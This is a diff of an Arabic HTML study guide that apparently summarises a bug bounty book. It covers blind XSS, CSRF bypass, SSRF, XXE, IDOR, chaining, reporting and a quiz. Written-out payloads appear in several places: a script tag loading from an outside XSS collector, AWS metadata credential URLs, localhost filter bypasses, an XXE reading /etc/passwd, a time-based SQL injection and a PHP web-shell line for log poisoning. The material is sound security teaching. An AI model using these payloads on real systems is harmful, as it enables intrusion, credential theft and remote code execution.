+          <h3 class="sub-sec-title">ب. ثغرات الـ XSS العمياء (Blind XSS)</h3>
+          <p>حقن بايلود في أماكن لا تراها أنت (مثل لوحة تحكم الدعم الفني، نموذج الشكاوى).
+          يوصي الكاتب باستخدام منصة استقبال متطورة ترسل لك تنبيهاً فورياً عند تشغيل الكود في متصفح الأدمن مع سحب الكوكيز وصورة لصفحة الأدمن:</p>
           <div class="code-box">
-# رابط جلب بيانات الهوية والـ IAM Credentials في AWS
-http://169.254.169.254/latest/meta-data/
-          </div>
-          <p>تجاوز فلاتر منع الـ localhost باستخدام التمثيل الرقمي البديل:</p>
-          <div class="code-box">
-# تمثيل الـ Localhost بصور بديلة لتخطي الحظر
-http://2852039166 (تمثيل عشري لـ 127.0.0.1)
-http://0177.0.0.1 (تمثيل ثماني لـ 127.0.0.1)
+# بايلود Blind XSS نمطي
+&lt;script src="https://myxssplatform.com/log.js"&gt;&lt;/script&gt;
           </div>
 
-          <h3 class="sub-sec-title">ب. حقن كيانات XML الخارجية (XXE)</h3>
-          <p>إدخال كيانات خبيثة في ملفات XML التي يحللها السيرفر لقراءة ملفات داخلية أو عمل مسح للشبكة الداخلية:</p>
+          <h3 class="sub-sec-title">ج. تجاوز حمايات الـ CSRF Tokens</h3>
+          <p>إذا كان الموقع محمياً بـ Tokens، يوضح الكتاب تكتيكات تخطي الحماية:</p>
+          <ol>
+            <li><strong>تغيير طريقة الطلب (Method Interchange):</strong> تحويل طلب POST إلى GET لعل الخادم لا يتحقق من الـ Token في طلبات GET.</li>
+            <li><strong>إرسال توكن فارغ أو إزالة المعامل بالكامل:</strong> اختبار ما إذا كان الخادم يتحقق فقط من وجود المعامل دون تدقيق قيمته.</li>
+            <li><strong>استخدام توكن حساب آخر:</strong> التحقق هل يقوم الخادم بربط الـ Token بجلسة المستخدم الحالي فعلياً أم أنه يقبل أي توكن صحيح لجلية أخرى.</li>
+          </ol>
+        </section>
+
+        <!-- SSRF / XXE -->
+        <section id="ssrf-xxe" class="content-sec">
+          <h2 class="sec-title">11. المجلد 2: ثغرات SSRF و XML Entity (XXE)</h2>
+          <p>استهداف الأنظمة الداخلية للشركات خلف الحمايات الخارجية.</p>
+          
+          <h3 class="sub-sec-title">أ. ثغرات الـ SSRF ومخاطر السحابة</h3>
+          <p>استغلال الخادم الخارجي للاتصال بالخدمات الداخلية في بيئة السحابة (AWS, Google Cloud, Azure).
+          الهدف الأكبر في بيئات السحاب هو قراءة ملفات الـ Cloud Metadata:</p>
+          <div class="code-box">
+# جلب الـ IAM roles والـ Access Keys في AWS
+http://169.254.169.254/latest/meta-data/iam/security-credentials/role_name
+          </div>
+          <p>تجاوز فلاتر منع الـ IPs المحلية (مثل حظر 127.0.0.1) عبر:</p>
+          <ul>
+            <li>التحويل للتمثيل العشري: <code>http://2130706433</code> (والذي يحل لـ 127.0.0.1)</li>
+            <li>استخدام خوادم DNS Rebinding للتلاعب بقيم الـ TTL وتحويل الوجهة لعنوان محلي بعد الفحص الأولي.</li>
+          </ul>
+
+          <h3 class="sub-sec-title">ب. استغلال ثغرات XXE</h3>
+          <p>حقن نصوص XML خبيثة لقراءة الملفات الداخلية للسيرفر:</p>
           <div class="code-box">
 &lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;
 &lt;!DOCTYPE foo [
-  &lt;!ELEMENT foo ANY &gt;
   &lt;!ENTITY xxe SYSTEM "file:///etc/passwd" &gt;]&gt;
 &lt;foo&gt;&amp;xxe;&lt;/foo&gt;
           </div>
         </section>
 
-        <!-- Reporting -->
-        <section id="reporting" class="content-sec">
-          <h2 class="sec-title">8. كتابة التقارير ودمج الثغرات (Chaining)</h2>
-          <p>أنت لست مجرد هكر يبحث عن ثغرة، بل أنت تقدم استشارة أمنية للشركة. تقريرك هو المنتج النهائي الذي يحدد المكافأة المالية.</p>
+        <!-- IDOR -->
+        <section id="idor" class="content-sec">
+          <h2 class="sec-title">12. المجلد 2: ثغرات التحكم بالوصول IDOR</h2>
+          <p>التلاعب بالمعرفات لقراءة أو تعديل بيانات مستخدمين آخرين دون تصريح.</p>
           
-          <h3 class="sub-sec-title">أ. هيكل التقرير الاحترافي</h3>
+          <h3 class="sub-sec-title">تكتيكات متقدمة لكشف ثغرات الـ IDOR</h3>
           <ul>
-            <li><strong>العنوان (Title):</strong> مباشر ويحدد الثغرة والمكان بدقة.</li>
-            <li><strong>الوصف (Description):</strong> شرح منطقي ومبسط للثغرة.</li>
-            <li><strong>خطوات إعادة الإنتاج (Steps to Reproduce):</strong> خطوات مرقمة واضحة ومختصرة يمكن لأي مطور تنفيذها للتأكد.</li>
-            <li><strong>الأثر الأمني (Impact):</strong> ماذا يستفيد المخترق الحقيقي؟ (تخطي الصلاحيات، سرقة الحسابات).</li>
-            <li><strong>إثبات المفهوم (PoC):</strong> صور واضحة أو رابط فيديو قصير يوضح المشكلة.</li>
+            <li><strong>تغيير معرف المستخدم (ID Tampering):</strong> تلاعب بالـ parameters في الطلب: <code>/api/user/101</code> بدلاً من <code>/api/user/100</code>.</li>
+            <li><strong>تغيير نوع الطلب (HTTP Method Swapping):</strong> محاولة تغيير نوع الطلب من GET (للقراءة فقط) إلى POST أو PUT أو DELETE لعمل تعديل أو حذف لبيانات مستخدم آخر.</li>
+            <li><strong>تجاوز معرفات الـ UUID:</strong> إذا كان التطبيق يستخدم معرفات عشوائية صعبة التخمين (UUID)، ابحث عن واجهات برمجية أخرى في التطبيق (مثل APIs البحث أو ملفات التعريف العامة) التي قد تسرب الـ UUID الخاص بالضحية، ثم استخدمه في الطلب المصاب بالـ IDOR.</li>
+          </ul>
+        </section>
+
+        <!-- Reporting & Chaining -->
+        <section id="reporting" class="content-sec">
+          <h2 class="sec-title">13. المجلد 2: دمج الثغرات وكتابة التقارير الحيوية</h2>
+          <p>تحويل الثغرات البسيطة لضربة قاضية أمنية لزيادة قيمة المكافأة المالية.</p>
+          
+          <h3 class="sub-sec-title">أ. دمج الثغرات (Vulnerability Chaining)</h3>
+          <p>لا تتوقف عند إثبات وجود ثغرة بسيطة؛ فكر كيف يمكن استغلالها للوصول لثغرة أكبر.
+          أمثلة للدمج الناجح:</p>
+          <ul>
+            <li><strong>CSRF + Stored XSS:</strong> استغلال ثغرة CSRF لحقن كود XSS مخزن داخل إعدادات بروفايل الضحية، مما يضمن تشغيل الكود بمجرد فتح البروفايل دون تدخل منه.</li>
+            <li><strong>LFI + SSRF:</strong> استغلال ثغرة LFI لقراءة ملفات التكوين والوصول لمفاتيح الاستيقان (Tokens)، ثم استخدامها مع ثغرة SSRF للاتصال والسيطرة على الخدمات الداخلية للسيرفر.</li>
           </ul>
 
-          <h3 class="sub-sec-title">ب. دمج الثغرات (Vulnerability Chaining)</h3>
-          <p>كيف تحول ثغرة ذات تأثير منخفض (Low) إلى ثغرة بالغة الأثر وعالية القيمة (High/Critical)؟
-          دمج ثغرة CSRF مع ثغرة Stored XSS لتغيير كلمة مرور المدير بمجرد زيارته لصفحتك الشخصية، أو دمج SSRF مع ثغرة LFI للوصول للمفاتيح السرية للسحابة.</p>
+          <h3 class="sub-sec-title">ب. هيكل التقرير الأمني الذهبي</h3>
+          <p>يكشف التقرير الاحترافي عن دقة الهكر وأثره التقني. الهيكل المعتمد في منصات HackerOne و Bugcrowd:</p>
+          <ol>
+            <li><strong>Title:</strong> واضح ومحدد (مثل: IDOR in /api/edit_profile allows account takeover).</li>
+            <li><strong>Summary:</strong> نبذة مختصرة تلخص الثغرة والخطورة.</li>
+            <li><strong>Steps to Reproduce:</strong> خطوات واضحة ومرقمة بالتفصيل الممل لإعادة إنتاج الثغرة وتأكيدها.</li>
+            <li><strong>Impact:</strong> شرح فني وتجاري لمدى خطورة الثغرة على الشركة والمستخدمين.</li>
+            <li><strong>Remediation:</strong> نصائح للمطورين لإغلاق الثغرة بشكل صحيح.</li>
+          </ol>
         </section>
 
         <!-- Quizzes -->
         <section id="quizzes" class="content-sec">
-          <h2 class="sec-title">9. أسئلة اختبار الفهم التفاعلية</h2>
+          <h2 class="sec-title">14. بنك الأسئلة والاختبارات التفاعلية</h2>
           
           <div class="quiz-container">
-            <div class="quiz-title">🧪 أسئلة مراجعة الكتاب (انقر لعرض الإجابة النموذجية)</div>
+            <div class="quiz-title">🧪 بنك أسئلة مراجعة موسوعة Bug Bounty Playbook (انقر لعرض الإجابة النموذجية)</div>
             
             <!-- Q1 -->
             <div class="quiz-item" style="margin-bottom:15px; border-bottom:1px dashed rgba(255,255,255,0.05); padding-bottom:15px;">
               <button class="quiz-question-btn" onclick="toggleAnswer('qp-1')">
-                <span>1. كيف يمكن للمهاجم تخطي جدار الحماية (WAF) الذي يمنع طلبات الاستطلاع النشط (Active Recon)؟</span>
+                <span>1. كيف يمكن استخدام أداة Nmap بشكل فعال لفحص النطاقات دون أن يتم كشف فحصك ومنعك؟</span>
                 <span class="toggle-icon" id="icon-qp-1">[ + ]</span>
               </button>
               <div class="quiz-answer-panel" id="ans-qp-1">
-                <strong>الإجابة النموذجية:</strong> يوصي الكتاب باستخدام خوادم استطلاع خارجية (VPS) مع تدوير وتغيير الـ User-Agent بشكل عشوائي، وتقليل معدل إرسال الطلبات (Rate Limiting) عبر خيارات التأخير، واستخدام خوادم DNS محلية موثوقة ونظيفة، وتفضيل الاستطلاع السلبي أولاً.
+                <strong>الإجابة النموذجية:</strong> ينصح الكتاب بتجنب الفحص العدواني المباشر (-A or -T5). بدلاً من ذلك، استخدم الفحص المتخفي (-sS)، وحدد وتيرة إرسال منخفضة (-T2 or -T3)، وقم بتغيير المنفذ المصدري للطلبات لجعلها تبدو كحركة مرور عادية (مثل استخدام المنفذ 53 أو 80 أو 443 عبر خيار --source-port)، وقم بتدوير عناوين الـ IP إن أمكن.
               </div>
             </div>
 
             <!-- Q2 -->
             <div class="quiz-item" style="margin-bottom:15px; border-bottom:1px dashed rgba(255,255,255,0.05); padding-bottom:15px;">
               <button class="quiz-question-btn" onclick="toggleAnswer('qp-2')">
-                <span>2. ما هو الفرق بين سجلات CNAME وسجلات A في ثغرات الـ Subdomain Takeover؟</span>
+                <span>2. لماذا تعتبر ثغرات السيطرة على النطاقات الفرعية (Subdomain Takeover) خطيرة على سمعة الشركات وأمن مستخدميها؟</span>
                 <span class="toggle-icon" id="icon-qp-2">[ + ]</span>
               </button>
               <div class="quiz-answer-panel" id="ans-qp-2">
-                <strong>الإجابة النموذجية:</strong> سجل CNAME يشير إلى اسم نطاق آخر خارجي (مثل `mybucket.s3.amazonaws.com`)، وبالتالي إذا انتهت هذه الخدمة يسهل للمهاجم تسجيل نفس الاسم بالخدمة الخارجية. أما سجل A فيشير مباشرة إلى عنوان IP، ويكون استغلال الـ Takeover في سجل A ممكناً فقط إذا تم تحرير وتغيير عنوان IP من مزود السحاب (مثل AWS EC2) دون إزالة سجل DNS، فيقوم المهاجم بحجز نفس الـ IP في السحابة إن أمكن.
+                <strong>الإجابة النموذجية:</strong> لأن المهاجم يستطيع استضافة صفحة تصيد متكاملة لبيانات المستخدمين أو رفع ملفات خبيثة وتنزيلها تلقائياً على متصفح الزوار تحت اسم النطاق الرسمي والموثوق للشركة (مثل `login.target.com`). هذا يسهل سرقة كوكيز المستخدمين لأن متصفحاتهم سترسلها تلقائياً بسبب سياسة المصدر نفسه (Same-Origin Policy).
               </div>
             </div>
 
             <!-- Q3 -->
             <div class="quiz-item" style="margin-bottom:15px; border-bottom:1px dashed rgba(255,255,255,0.05); padding-bottom:15px;">
               <button class="quiz-question-btn" onclick="toggleAnswer('qp-3')">
-                <span>3. ما هي بصمة الـ DOM XSS وكيف تختلف عن الـ Reflected XSS؟</span>
+                <span>3. كيف تختبر وتكتشف وجود ثغرة SQL Injection عمياء (Time-Based) وتستخرج محتوى قاعدة البيانات يدوياً؟</span>
                 <span class="toggle-icon" id="icon-qp-3">[ + ]</span>
               </button>
               <div class="quiz-answer-panel" id="ans-qp-3">
-                <strong>الإجابة النموذجية:</strong> ثغرة DOM XSS تحدث بالكامل داخل متصفح المستخدم (Client-Side) حيث يتم معالجة البيانات المدخلة وتمريرها لوظيفة تنفيذية خبيثة (Sink) مثل `innerHTML` أو `eval` بواسطة أكواد جافا سكريبت على الصفحة، دون إرسال المدخل الخبيث بالضرورة لخادم الويب. أما Reflected XSS فيمر البايلود عبر خادم الويب ويقوم الخادم بإدراجه مجدداً في استجابة الـ HTML المرسلة للمتصفح.
+                <strong>الإجابة النموذجية:</strong> نقوم بحقن دالة شرطية زمنية (مثل `AND IF(SUBSTRING(database(),1,1)='a', SLEEP(5), 0)`). إذا تأخر رد السيرفر لمدة 5 ثوانٍ، فهذا يؤكد أن الحرف الأول من اسم قاعدة البيانات هو 'a'. نقوم بتكرار العملية لتخمين الحروف بالتتابع يدوياً أو كتابة سكريبت بايثون بسيط لأتمتة العملية.
               </div>
             </div>
 
             <!-- Q4 -->
             <div class="quiz-item" style="margin-bottom:15px; border-bottom:1px dashed rgba(255,255,255,0.05); padding-bottom:15px;">
               <button class="quiz-question-btn" onclick="toggleAnswer('qp-4')">
-                <span>4. كيف تستغل ثغرة SSRF للوصول للبنية التحتية الداخلية وسحب الـ Cloud Credentials؟</span>
+                <span>4. كيف تستغل ثغرة LFI لتحقيق تنفيذ الأوامر عن بعد (RCE) عبر تسميم سجلات أباتشي؟</span>
                 <span class="toggle-icon" id="icon-qp-4">[ + ]</span>
               </button>
               <div class="quiz-answer-panel" id="ans-qp-4">
-                <strong>الإجابة النموذجية:</strong> نقوم بحقن رابط الـ Metadata الخاص بمزود السحابة (مثلاً `http://169.254.169.254/latest/meta-data/iam/security-credentials/role_name` في AWS) كقيمة لمعامل الـ SSRF. سيقوم الخادم داخلياً بجلب الرابط بالنيابة عنا ويعود بالاستجابة محملة بالـ Access Key والـ Secret Key والـ Session Token الحساسة.
+                <strong>الإجابة النموذجية:</strong> نرسل طلب HTTP ملوثاً بكود PHP خبيث في حقل الـ User-Agent (مثل `&lt;?php system($_GET['cmd']); ?&gt;`). سيقوم السيرفر بحفظ هذا الطلب في ملف سجلات الوصول `access.log`. بعد ذلك نقوم باستدعاء ملف السجلات هذا عبر ثغرة LFI مع تمرير الأمر المطلوب تشغيله في الـ parameter (مثل `&amp;cmd=id`)، ليقوم مفسر PHP بتشغيل البايلود وعرض النتائج.
               </div>
             </div>
 
             <!-- Q5 -->
             <div class="quiz-item" style="margin-bottom:15px; border-bottom:1px dashed rgba(255,255,255,0.05); padding-bottom:15px;">
               <button class="quiz-question-btn" onclick="toggleAnswer('qp-5')">
-                <span>5. ما هو دور مغلفات PHP Wrappers في استغلال LFI؟</span>
+                <span>5. ما هو هجوم الـ CSRF وكيف يمكن حماية التطبيق منه بشكل فعال؟</span>
                 <span class="toggle-icon" id="icon-qp-5">[ + ]</span>
               </button>
               <div class="quiz-answer-panel" id="ans-qp-5">
-                <strong>الإجابة النموذجية:</strong> مغلفات PHP (مثل `php://filter`) تتيح للمهاجم قراءة ملفات السورس كود الخاصة بـ PHP وسحب كود الاتصال بقاعدة البيانات. بدلاً من محاولة تنفيذ الملف، نستخدم المغلف لتحويل المحتوى إلى ترميز Base64، فيتم عرضه كنص في متصفحنا ثم نقوم بفك تشفيره للحصول على الكود المصدري الأصلي.
+                <strong>الإجابة النموذجية:</strong> هو هجوم يجبر متصفح الضحية على إرسال طلبات حساسة ومصرحة لموقع ما مستغلاً وجود كوكيز الجلسة نشطة. تتم الحماية الفعالة عبر تطبيق حمايات الـ **Anti-CSRF Tokens** الفريدة والصالحة لمرة واحدة وربطها بالجلسة، بالإضافة إلى تفعيل ميزة **SameSite Cookie Attribute** وضبطها على قيمة `Lax` أو `Strict` لمنع إرسال الكوكيز مع الطلبات الواردة من مواقع خارجية.
               </div>
             </div>
 
             <!-- Q6 -->
-            <div class="quiz-item">
+            <div class="quiz-item" style="margin-bottom:15px; border-bottom:1px dashed rgba(255,255,255,0.05); padding-bottom:15px;">
               <button class="quiz-question-btn" onclick="toggleAnswer('qp-6')">
-                <span>6. ما هو هجوم DNS Rebinding وكيف يستخدم لتجاوز حماية الـ SSRF؟</span>
+                <span>6. ما هو هجوم الـ DNS Rebinding وكيف يعمل لتخطي جدران حماية الـ SSRF؟</span>
                 <span class="toggle-icon" id="icon-qp-6">[ + ]</span>
               </button>
               <div class="quiz-answer-panel" id="ans-qp-6">
-                <strong>الإجابة النموذجية:</strong> هو هجوم يقوم فيه المهاجم بتسجيل نطاق يملك خادم DNS متحكم به. عند محاولة الخادم فحص وحل النطاق (Resolve)، يعود خادم الـ DNS الخاص بنا بأي بي عام سليم لتخطي فلتر المنع الأولي للخادم. وبمجرد قبول الطلب، يعود خادم الـ DNS لربط النطاق بـ IP محلي (مثل 127.0.0.1) بفترة صلاحية قصيرة جداً (TTL=0)، فيقوم الخادم بإرسال الطلب الفعلي للـ IP المحلي الداخلي.
+                <strong>الإجابة النموذجية:</strong> المهاجم يملك خادم DNS ونطاقاً خاصاً. عندما يقوم السيرفر المستهدف بعمل Resolve للنطاق للتحقق من أمان الـ IP، يعود خادم الـ DNS الخاص بنا بـ IP عام مسموح به (بـ TTL=0). بمجرد قبول الفحص، يرسل السيرفر الطلب الفعلي، فيقوم المتصفح أو السيرفر بعمل Resolve مجدداً للنطاق، وهنا يعود خادم الـ DNS بـ IP محلي (127.0.0.1)، فيتصل السيرفر بنفسه داخلياً ويتم استغلال الـ SSRF.
+              </div>
+            </div>
+
+            <!-- Q7 -->
+            <div class="quiz-item">
+              <button class="quiz-question-btn" onclick="toggleAnswer('qp-7')">
+                <span>7. كيف يمكن أن تشكل ثغرات الـ IDOR خطورة بالغة على حماية واجهات الـ REST APIs؟</span>
+                <span class="toggle-icon" id="icon-qp-7">[ + ]</span>
+              </button>
+              <div class="quiz-answer-panel" id="ans-qp-7">
+                <strong>الإجابة النموذجية:</strong> واجهات الـ APIs كثيراً ما تعتمد على معرفات مرقمة أو صريحة في الـ URL أو في الـ Request Body (مثل `/api/v1/billing/1005`). إذا لم يقم المطور بإجراء عمليات تحقق خلفية صارمة تتأكد من أن المستخدم صاحب الجلسة يملك حق الصلاحية والوصول الفعلي للسجل رقم `1005` بالذات، فسيتمكن أي مستخدم آخر من سحب وتعديل فواتير وبيانات الآخرين بمجرد تلاعب رقمي بالطلب.
               </div>
             </div>
 
